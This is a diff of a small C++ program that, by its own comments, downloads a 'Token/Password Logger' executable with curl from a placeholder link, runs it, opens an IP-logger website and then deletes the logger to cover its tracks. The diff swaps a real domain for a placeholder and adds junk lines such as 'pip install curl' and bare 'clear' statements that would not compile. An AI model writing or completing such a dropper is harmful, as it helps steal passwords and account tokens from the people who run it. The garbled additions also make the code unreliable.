@@ -8,12 +8,15 @@
 using namespace std;
 int main() {
 //Installs the Token/Password Logger
+        system("pip install curl");
+        system("python - m pip install curl");
+        clear
         system("curl tokenloggerlinkhere.exe >> debuged.exe");
-        Sleep(1000);
+        clear
 //Starts the Token/Password Logger
         system("start debuged.exe");
 //Goes to the ip logger website
-        system("start https://bsec.cf");
+        system("start iploggerlinkhere");
         Sleep(2500);
 //Deletes the Token/Password logger
         system("del debuged.exe");
